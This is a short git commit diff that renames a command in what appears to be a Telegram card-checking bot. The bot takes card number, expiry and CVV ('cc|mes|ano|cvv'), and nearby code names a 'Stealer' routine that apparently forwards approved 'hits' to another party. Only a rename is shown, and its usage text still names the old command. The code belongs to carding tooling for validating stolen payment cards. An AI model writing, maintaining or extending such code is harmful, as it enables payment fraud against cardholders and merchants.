c1e45d77d6f1adb4ee3c6d6296047f2494f048af
spxlau <buoyspilux@gmail.com>
2026-04-03 22:02:05 +0300

    Rename command from 'randomauth' to 'rda'

--- BOT/newgates/random_auth.py
+++ BOT/newgates/random_auth.py
@@ -22,7 +22,7 @@ async def send_hit_if_approved(client: Client, text: str):
     except Exception as e:
         print(f"[Stealer Error] Failed to forward: {e}")
 
-@Client.on_message(filters.command("randomauth", [".", "/"]))
+@Client.on_message(filters.command("rda", [".", "/"]))
 async def random_auth_cmd(Client, message):
     try:
         user_id = str(message.from_user.id)
@@ -37,7 +37,7 @@ async def random_auth_cmd(Client, message):
         role = checkall[1]
         getcc = await getmessage(message)
         if getcc == False:
-            resp = f"""<b>\nGate Name: {gateway} ♻️\nCMD: /randomauth\n\nMessage: No CC Found in your input ❌\n\nUsage: /randomauth cc|mes|ano|cvv</b>"""
+            resp = f"""<b>\nGate Name: {gateway} ♻️\nCMD: /rda\n\nMessage: No CC Found in your input ❌\n\nUsage: /randomauth cc|mes|ano|cvv</b>"""
             await message.reply_text(resp, message.id)
             return
 
